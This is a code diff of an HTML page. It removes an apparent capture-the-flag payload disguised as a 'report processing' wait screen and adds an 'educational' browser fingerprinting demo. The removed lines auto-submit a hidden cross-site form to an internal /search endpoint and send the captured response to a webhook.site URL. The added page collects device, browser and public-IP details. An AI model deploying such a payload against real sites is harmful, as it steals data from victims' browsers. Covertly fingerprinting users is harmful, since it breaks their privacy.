@@ -1,43 +1,771 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Report Processing</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Digital Forensic Collector - Educational Demo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            padding: 30px 0;
+            border-bottom: 2px solid #00b4d8;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            color: #00b4d8;
+            text-shadow: 0 0 10px rgba(0, 180, 216, 0.3);
+        }
+
+        .header .warning {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #ff0000;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 20px;
+            font-size: 0.9rem;
+        }
+
+        .controls {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .control-card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .control-card h3 {
+            color: #90e0ef;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .control-card h3 i {
+            font-size: 1.2rem;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(45deg, #0077b6, #0096c7);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(45deg, #0096c7, #00b4d8);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 180, 216, 0.3);
+        }
+
+        .btn-danger {
+            background: linear-gradient(45deg, #d00000, #dc2f02);
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background: linear-gradient(45deg, #dc2f02, #e85d04);
+            transform: translateY(-2px);
+        }
+
+        .btn-success {
+            background: linear-gradient(45deg, #2d6a4f, #40916c);
+            color: white;
+        }
+
+        .btn-success:hover {
+            background: linear-gradient(45deg, #40916c, #52b788);
+            transform: translateY(-2px);
+        }
+
+        .data-display {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .data-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 10px;
+        }
+
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px 5px 0 0;
+            transition: all 0.3s ease;
+        }
+
+        .tab.active {
+            background: rgba(0, 180, 216, 0.2);
+            border-bottom: 2px solid #00b4d8;
+        }
+
+        .tab:hover:not(.active) {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .data-content {
+            max-height: 500px;
+            overflow-y: auto;
+            padding: 10px;
+        }
+
+        .data-section {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .data-section.active {
+            display: block;
+        }
+
+        .data-item {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-left: 3px solid #00b4d8;
+        }
+
+        .data-item h4 {
+            color: #90e0ef;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        pre {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0077b6, #00b4d8);
+            border-radius: 10px;
+            transition: width 0.5s ease;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #dc2f02;
+        }
+
+        .status-dot.active {
+            background: #52b788;
+            animation: pulse 1.5s infinite;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        @media (max-width: 768px) {
+            .controls {
+                grid-template-columns: 1fr;
+            }
+            
+            .header h1 {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
 </head>
 <body>
-    <h1>Processing your report...</h1>
-    <p>Please wait...</p>
-    
-    <!-- Hidden form to POST to /search -->
-    <form id="searchForm" method="POST" action="http://web:5000/search" target="responseFrame" style="display:none;">
-        <input type="hidden" name="search" value="/readflagbinary">
-    </form>
-    
-    <!-- Hidden iframe to capture response -->
-    <iframe id="responseFrame" name="responseFrame" style="display:none;"></iframe>
-    
+    <div class="container">
+        <div class="header">
+            <h1>🔍 Digital Forensic Collector</h1>
+            <p>Educational Demonstration - For Legal Security Testing Only</p>
+            <div class="warning">
+                ⚠️ WARNING: This tool is for EDUCATIONAL PURPOSES only. Use only on devices you own or have explicit permission to test.
+            </div>
+        </div>
+
+        <div class="controls">
+            <div class="control-card">
+                <h3>📊 Data Collection Controls</h3>
+                <div class="button-group">
+                    <button class="btn btn-primary" onclick="startCollection()">
+                        <span>▶️</span> Start Collection
+                    </button>
+                    <button class="btn btn-danger" onclick="stopCollection()" disabled id="stopBtn">
+                        <span>⏹️</span> Stop Collection
+                    </button>
+                    <button class="btn btn-success" onclick="exportData()">
+                        <span>💾</span> Export Data
+                    </button>
+                </div>
+                <div class="status-indicator" id="statusIndicator">
+                    <div class="status-dot" id="statusDot"></div>
+                    <span id="statusText">Ready to start collection</span>
+                </div>
+                <div class="progress-bar" id="progressBar">
+                    <div class="progress-fill" id="progressFill" style="width: 0%"></div>
+                </div>
+            </div>
+
+            <div class="control-card">
+                <h3>🎯 Collection Scope</h3>
+                <div class="button-group">
+                    <label style="display: block; margin-bottom: 10px;">
+                        <input type="checkbox" checked id="chkNetwork"> Network Information
+                    </label>
+                    <label style="display: block; margin-bottom: 10px;">
+                        <input type="checkbox" checked id="chkDevice"> Device Fingerprint
+                    </label>
+                    <label style="display: block; margin-bottom: 10px;">
+                        <input type="checkbox" checked id="chkBrowser"> Browser Analysis
+                    </label>
+                    <label style="display: block; margin-bottom: 10px;">
+                        <input type="checkbox" id="chkLocation"> Location Data
+                    </label>
+                </div>
+            </div>
+        </div>
+
+        <div class="data-display">
+            <div class="data-tabs">
+                <div class="tab active" onclick="showTab('network')">🌐 Network</div>
+                <div class="tab" onclick="showTab('device')">📱 Device</div>
+                <div class="tab" onclick="showTab('browser')">🔍 Browser</div>
+                <div class="tab" onclick="showTab('timeline')">⏱️ Timeline</div>
+                <div class="tab" onclick="showTab('raw')">📄 Raw Data</div>
+            </div>
+            
+            <div class="data-content">
+                <div id="networkTab" class="data-section active">
+                    <div id="networkData">No network data collected yet</div>
+                </div>
+                
+                <div id="deviceTab" class="data-section">
+                    <div id="deviceData">No device data collected yet</div>
+                </div>
+                
+                <div id="browserTab" class="data-section">
+                    <div id="browserData">No browser data collected yet</div>
+                </div>
+                
+                <div id="timelineTab" class="data-section">
+                    <div id="timelineData">No timeline data collected yet</div>
+                </div>
+                
+                <div id="rawTab" class="data-section">
+                    <pre id="rawData">// Collected data will appear here</pre>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <script>
-        // Submit the form
-        document.getElementById('searchForm').submit();
-        
-        // Wait a moment for response, then capture and exfiltrate
-        setTimeout(function() {
-            try {
-                // Try to read iframe content
-                let iframe = document.getElementById('responseFrame');
-                let iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                let content = iframeDoc.body.innerText || iframeDoc.documentElement.innerText || '';
-                
-                // Exfiltrate to webhook
-                let webhookUrl = 'https://webhook.site/227b0e75-41a9-46f7-b5f1-9bc2d27c327d?data=' + encodeURIComponent(content);
-                fetch(webhookUrl).catch(e => console.log(e));
-                
-            } catch(e) {
-                // If same-origin fails, just send error
-                let webhookUrl = 'https://webhook.site/227b0e75-41a9-46f7-b5f1-9bc2d27c327d?error=' + encodeURIComponent(e.message);
-                fetch(webhookUrl).catch(e => console.log(e));
+        class ForensicCollector {
+            constructor() {
+                this.collectionActive = false;
+                this.collectedData = {
+                    metadata: {
+                        caseId: 'CASE-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase(),
+                        startTime: null,
+                        endTime: null,
+                        scope: []
+                    },
+                    network: {},
+                    device: {},
+                    browser: {},
+                    timeline: [],
+                    raw: {}
+                };
+                this.collectionInterval = null;
             }
-        }, 2000);
+
+            async startCollection() {
+                if (this.collectionActive) return;
+                
+                this.collectionActive = true;
+                this.collectedData.metadata.startTime = new Date().toISOString();
+                this.collectedData.metadata.scope = this.getSelectedScope();
+                
+                // Update UI
+                document.getElementById('stopBtn').disabled = false;
+                document.getElementById('statusDot').classList.add('active');
+                document.getElementById('statusText').textContent = 'Collection in progress...';
+                
+                // Start collection intervals
+                this.collectionInterval = setInterval(() => {
+                    this.collectData();
+                    this.updateProgress();
+                }, 2000); // Collect every 2 seconds
+                
+                // Initial collection
+                this.collectData();
+                
+                return true;
+            }
+
+            stopCollection() {
+                this.collectionActive = false;
+                this.collectedData.metadata.endTime = new Date().toISOString();
+                
+                // Clear intervals
+                if (this.collectionInterval) {
+                    clearInterval(this.collectionInterval);
+                }
+                
+                // Update UI
+                document.getElementById('stopBtn').disabled = true;
+                document.getElementById('statusDot').classList.remove('active');
+                document.getElementById('statusText').textContent = 'Collection stopped';
+                document.getElementById('progressFill').style.width = '100%';
+                
+                // Final data update
+                this.updateDisplays();
+            }
+
+            getSelectedScope() {
+                const scope = [];
+                if (document.getElementById('chkNetwork').checked) scope.push('network');
+                if (document.getElementById('chkDevice').checked) scope.push('device');
+                if (document.getElementById('chkBrowser').checked) scope.push('browser');
+                if (document.getElementById('chkLocation').checked) scope.push('location');
+                return scope;
+            }
+
+            async collectData() {
+                try {
+                    // Collect Network Data
+                    if (this.collectedData.metadata.scope.includes('network')) {
+                        await this.collectNetworkData();
+                    }
+                    
+                    // Collect Device Data
+                    if (this.collectedData.metadata.scope.includes('device')) {
+                        await this.collectDeviceData();
+                    }
+                    
+                    // Collect Browser Data
+                    if (this.collectedData.metadata.scope.includes('browser')) {
+                        await this.collectBrowserData();
+                    }
+                    
+                    // Add to timeline
+                    this.collectedData.timeline.push({
+                        timestamp: new Date().toISOString(),
+                        event: 'data_collection',
+                        dataTypes: [...this.collectedData.metadata.scope]
+                    });
+                    
+                    // Update displays
+                    this.updateDisplays();
+                    
+                } catch (error) {
+                    console.error('Collection error:', error);
+                }
+            }
+
+            async collectNetworkData() {
+                const networkData = {
+                    timestamp: new Date().toISOString(),
+                    connection: {},
+                    ipInfo: null
+                };
+                
+                // Get connection info
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection) {
+                    networkData.connection = {
+                        effectiveType: connection.effectiveType || 'unknown',
+                        downlink: connection.downlink || 'unknown',
+                        rtt: connection.rtt || 'unknown',
+                        saveData: connection.saveData || false,
+                        type: connection.type || 'unknown'
+                    };
+                }
+                
+                // Get online status
+                networkData.online = navigator.onLine;
+                
+                // Get public IP (simulated for demo)
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    networkData.ipInfo = {
+                        publicIp: data.ip,
+                        source: 'ipify.org'
+                    };
+                } catch (error) {
+                    networkData.ipInfo = {
+                        publicIp: 'Simulated for demo',
+                        note: 'Real IP detection disabled in demo'
+                    };
+                }
+                
+                this.collectedData.network = networkData;
+            }
+
+            async collectDeviceData() {
+                const deviceData = {
+                    timestamp: new Date().toISOString(),
+                    fingerprint: this.generateFingerprint(),
+                    hardware: {},
+                    software: {}
+                };
+                
+                // Hardware info
+                deviceData.hardware = {
+                    cores: navigator.hardwareConcurrency || 'unknown',
+                    memory: navigator.deviceMemory || 'unknown',
+                    maxTouchPoints: navigator.maxTouchPoints || 0
+                };
+                
+                // Screen info
+                deviceData.screen = {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio || 1,
+                    orientation: screen.orientation ? screen.orientation.type : 'unknown'
+                };
+                
+                // Platform info
+                deviceData.platform = navigator.platform;
+                deviceData.vendor = navigator.vendor || 'unknown';
+                
+                this.collectedData.device = deviceData;
+            }
+
+            async collectBrowserData() {
+                const browserData = {
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    languages: navigator.languages || [navigator.language],
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack || 'unknown',
+                    javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false
+                };
+                
+                // Detect browser
+                browserData.detectedBrowser = this.detectBrowser();
+                
+                // Get installed plugins
+                browserData.plugins = Array.from(navigator.plugins || []).map(plugin => ({
+                    name: plugin.name,
+                    filename: plugin.filename,
+                    description: plugin.description
+                }));
+                
+                // Get mime types
+                browserData.mimeTypes = Array.from(navigator.mimeTypes || []).map(mime => ({
+                    type: mime.type,
+                    description: mime.description,
+                    suffixes: mime.suffixes
+                }));
+                
+                this.collectedData.browser = browserData;
+            }
+
+            generateFingerprint() {
+                // Simplified fingerprint for demo
+                const components = [
+                    navigator.userAgent,
+                    navigator.platform,
+                    screen.width + 'x' + screen.height,
+                    navigator.language,
+                    (new Date().getTimezoneOffset()).toString(),
+                    !!window.sessionStorage,
+                    !!window.localStorage,
+                    navigator.hardwareConcurrency || 'unknown'
+                ];
+                
+                // Simple hash function
+                let hash = 0;
+                const str = components.join('|');
+                for (let i = 0; i < str.length; i++) {
+                    const char = str.charCodeAt(i);
+                    hash = ((hash << 5) - hash) + char;
+                    hash = hash & hash;
+                }
+                
+                return Math.abs(hash).toString(36).toUpperCase();
+            }
+
+            detectBrowser() {
+                const ua = navigator.userAgent;
+                if (ua.includes("Firefox")) return "Firefox";
+                if (ua.includes("SamsungBrowser")) return "Samsung Internet";
+                if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+                if (ua.includes("Trident")) return "Internet Explorer";
+                if (ua.includes("Edge")) return "Edge";
+                if (ua.includes("Chrome")) return "Chrome";
+                if (ua.includes("Safari")) return "Safari";
+                return "Unknown";
+            }
+
+            updateProgress() {
+                if (!this.collectionActive) return;
+                
+                const startTime = new Date(this.collectedData.metadata.startTime);
+                const currentTime = new Date();
+                const elapsed = (currentTime - startTime) / 1000; // in seconds
+                
+                // Demo: progress based on elapsed time (max 30 seconds)
+                const progress = Math.min((elapsed / 30) * 100, 100);
+                document.getElementById('progressFill').style.width = progress + '%';
+            }
+
+            updateDisplays() {
+                // Update Network Tab
+                const networkHtml = this.formatNetworkData();
+                document.getElementById('networkData').innerHTML = networkHtml;
+                
+                // Update Device Tab
+                const deviceHtml = this.formatDeviceData();
+                document.getElementById('deviceData').innerHTML = deviceHtml;
+                
+                // Update Browser Tab
+                const browserHtml = this.formatBrowserData();
+                document.getElementById('browserData').innerHTML = browserHtml;
+                
+                // Update Timeline Tab
+                const timelineHtml = this.formatTimelineData();
+                document.getElementById('timelineData').innerHTML = timelineHtml;
+                
+                // Update Raw Data Tab
+                document.getElementById('rawData').textContent = 
+                    JSON.stringify(this.collectedData, null, 2);
+            }
+
+            formatNetworkData() {
+                if (!this.collectedData.network.timestamp) {
+                    return '<div class="data-item">No network data collected</div>';
+                }
+                
+                const data = this.collectedData.network;
+                return `
+                    <div class="data-item">
+                        <h4>📡 Connection Information</h4>
+                        <p><strong>Time:</strong> ${new Date(data.timestamp).toLocaleTimeString()}</p>
+                        <p><strong>Status:</strong> ${data.online ? '🟢 Online' : '🔴 Offline'}</p>
+                        <p><strong>Connection Type:</strong> ${data.connection.effectiveType || 'Unknown'}</p>
+                        <p><strong>Download Speed:</strong> ${data.connection.downlink || 'Unknown'} Mbps</p>
+                        <p><strong>Latency:</strong> ${data.connection.rtt || 'Unknown'} ms</p>
+                    </div>
+                    <div class="data-item">
+                        <h4>🌍 IP Information</h4>
+                        <p><strong>Public IP:</strong> ${data.ipInfo?.publicIp || 'Not detected'}</p>
+                        <p><strong>Source:</strong> ${data.ipInfo?.source || 'Local simulation'}</p>
+                    </div>
+                `;
+            }
+
+            formatDeviceData() {
+                if (!this.collectedData.device.timestamp) {
+                    return '<div class="data-item">No device data collected</div>';
+                }
+                
+                const data = this.collectedData.device;
+                return `
+                    <div class="data-item">
+                        <h4>📱 Device Fingerprint</h4>
+                        <p><strong>Fingerprint ID:</strong> ${data.fingerprint}</p>
+                        <p><strong>Platform:</strong> ${data.platform}</p>
+                        <p><strong>Vendor:</strong> ${data.vendor}</p>
+                    </div>
+                    <div class="data-item">
+                        <h4>💻 Hardware Information</h4>
+                        <p><strong>CPU Cores:</strong> ${data.hardware.cores}</p>
+                        <p><strong>Memory:</strong> ${data.hardware.memory ? data.hardware.memory + ' GB' : 'Unknown'}</p>
+                        <p><strong>Touch Points:</strong> ${data.hardware.maxTouchPoints}</p>
+                    </div>
+                    <div class="data-item">
+                        <h4>🖥️ Screen Information</h4>
+                        <p><strong>Resolution:</strong> ${data.screen.width} x ${data.screen.height}</p>
+                        <p><strong>Color Depth:</strong> ${data.screen.colorDepth} bit</p>
+                        <p><strong>Pixel Ratio:</strong> ${data.screen.pixelRatio}</p>
+                        <p><strong>Orientation:</strong> ${data.screen.orientation}</p>
+                    </div>
+                `;
+            }
+
+            formatBrowserData() {
+                if (!this.collectedData.browser.timestamp) {
+                    return '<div class="data-item">No browser data collected</div>';
+                }
+                
+                const data = this.collectedData.browser;
+                return `
+                    <div class="data-item">
+                        <h4>🔍 Browser Identification</h4>
+                        <p><strong>Detected Browser:</strong> ${data.detectedBrowser}</p>
+                        <p><strong>Cookies Enabled:</strong> ${data.cookiesEnabled ? 'Yes' : 'No'}</p>
+                        <p><strong>Do Not Track:</strong> ${data.doNotTrack}</p>
+                        <p><strong>Java Enabled:</strong> ${data.javaEnabled ? 'Yes' : 'No'}</p>
+                    </div>
+                    <div class="data-item">
+                        <h4>🌐 Language & Region</h4>
+                        <p><strong>Languages:</strong> ${data.languages.join(', ')}</p>
+                        <p><strong>User Agent:</strong> <small>${data.userAgent.substring(0, 100)}...</small></p>
+                    </div>
+                    <div class="data-item">
+                        <h4>🔌 Browser Plugins (${data.plugins.length})</h4>
+                        ${data.plugins.map(plugin => `
+                            <p><strong>${plugin.name}:</strong> ${plugin.description}</p>
+                        `).join('')}
+                    </div>
+                `;
+            }
+
+            formatTimelineData() {
+                if (this.collectedData.timeline.length === 0) {
+                    return '<div class="data-item">No timeline data collected</div>';
+                }
+                
+                const items = this.collectedData.timeline.slice(-10).reverse().map(event => `
+                    <div class="data-item">
+                        <h4>⏱️ ${new Date(event.timestamp).toLocaleTimeString()}</h4>
+                        <p><strong>Event:</strong> ${event.event}</p>
+                        <p><strong>Data Types:</strong> ${event.dataTypes.join(', ')}</p>
+                    </div>
+                `).join('');
+                
+                return items;
+            }
+
+            exportData() {
+                const dataStr = JSON.stringify(this.collectedData, null, 2);
+                const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+                
+                const exportFileDefaultName = `forensic-data-${this.collectedData.metadata.caseId}.json`;
+                
+                const linkElement = document.createElement('a');
+                linkElement.setAttribute('href', dataUri);
+                linkElement.setAttribute('download', exportFileDefaultName);
+                linkElement.click();
+                
+                alert(`Data exported as: ${exportFileDefaultName}`);
+            }
+        }
+
+        // Initialize the collector
+        const collector = new ForensicCollector();
+
+        // Tab switching function
+        function showTab(tabName) {
+            // Hide all tabs
+            document.querySelectorAll('.data-section').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Remove active class from all tab buttons
+            document.querySelectorAll('.tab').forEach(button => {
+                button.classList.remove('active');
+            });
+            
+            // Show selected tab
+            document.getElementById(tabName + 'Tab').classList.add('active');
+            
+            // Activate clicked tab button
+            event.target.classList.add('active');
+        }
+
+        // Control functions
+        function startCollection() {
+            collector.startCollection();
+            document.getElementById('progressFill').style.width = '0%';
+        }
+
+        function stopCollection() {
+            collector.stopCollection();
+        }
+
+        function exportData() {
+            collector.exportData();
+        }
+
+        // Initialize display
+        collector.updateDisplays();
     </script>
 </body>
 </html>
